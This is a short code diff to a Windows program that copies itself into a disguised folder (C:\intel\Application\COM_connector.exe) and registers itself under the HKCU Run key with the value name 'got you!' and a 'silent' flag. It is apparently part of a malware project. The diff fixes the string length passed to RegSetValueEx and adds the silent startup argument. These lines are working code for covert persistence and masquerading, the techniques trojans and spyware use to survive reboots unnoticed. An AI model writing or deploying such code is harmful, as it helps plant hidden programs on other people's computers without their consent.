@@ -14,7 +14,8 @@ const char g_szClassName[] = "myWindowClass";
 
 static const TCHAR reg_path[] = TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
 
-static const TCHAR hide_path[] = TEXT("C:\\intel\\Application\\COM connector.exe");
+static const TCHAR registry_path[] = TEXT("C:\\intel\\Application\\COM_connector.exe silent");
+static const TCHAR hide_path[] = TEXT("C:\\intel\\Application\\COM_connector.exe");
 static const TCHAR first_hide_dir[] = TEXT("C:\\intel");
 static const TCHAR second_hide_dir[] = TEXT("C:\\intel\\Application");
 
@@ -84,10 +85,10 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 		}
 		
 	}
-	//step 0.2: registering myself as startup
+	//step 0.2: registering myself at startup
 	HKEY hkey = NULL;
 	int a = RegCreateKey(HKEY_CURRENT_USER, reg_path, &hkey);
-	int b = RegSetValueEx(hkey, TEXT("got you!"), 0, REG_SZ, (BYTE*)hide_path, _tcslen(path) + 1);
+	int b = RegSetValueEx(hkey, TEXT("got you!"), 0, REG_SZ, (BYTE*)registry_path, _tcslen(registry_path) + 1);
 	int c = RegCloseKey(hkey);
 	 
 	if (_tcscmp(lpCmdLine, &silent) != 0) {
